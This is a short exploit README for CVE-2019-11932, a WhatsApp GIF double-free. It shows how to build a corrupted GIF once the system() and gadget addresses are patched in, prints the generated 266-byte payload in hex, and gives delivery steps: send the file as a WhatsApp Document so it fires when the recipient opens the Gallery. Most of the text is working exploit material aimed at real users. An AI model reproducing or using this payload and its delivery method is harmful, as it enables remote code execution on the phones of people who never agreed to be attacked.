# CVE-2019-11932

The address of system() and the gadget must be replaced by the actual address found by an information disclosure vulnerability.

After replacing address of system() and gadget. Run the code to generate the corrupted GIF file:

```
notroot@osboxes:~/Desktop/gif$ make
.....
.....
.....
notroot@osboxes:~/Desktop/gif$ ./exploit exploit.gif
buffer = 0x7ffc586cd8b0 size = 266
47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC
FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00
00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08
9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 84 9C 09 B0
C5 07 00 00 00 74 DE E4 11 F3 06 0F 08 37 63 40
C4 C8 21 C3 45 0C 1B 38 5C C8 70 71 43 06 08 1A
34 68 D0 00 C1 07 C4 1C 34 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 54 12 7C C0 C5 07 00 00 00 EE FF FF 2C 00 00
00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00
18 00 0A 00 0F 00 01 00 00 3B
```

Then copy exploit.gif file and send it as Document with WhatsApp to another WhatsApp user. Take note that it must not be sent as a Media file, otherwise WhatsApp tries to convert it into an MP4 before sending. Upon the user receives the malicous GIF file, nothing will happen until the user open WhatsApp Gallery to send a media file to his/her friend.
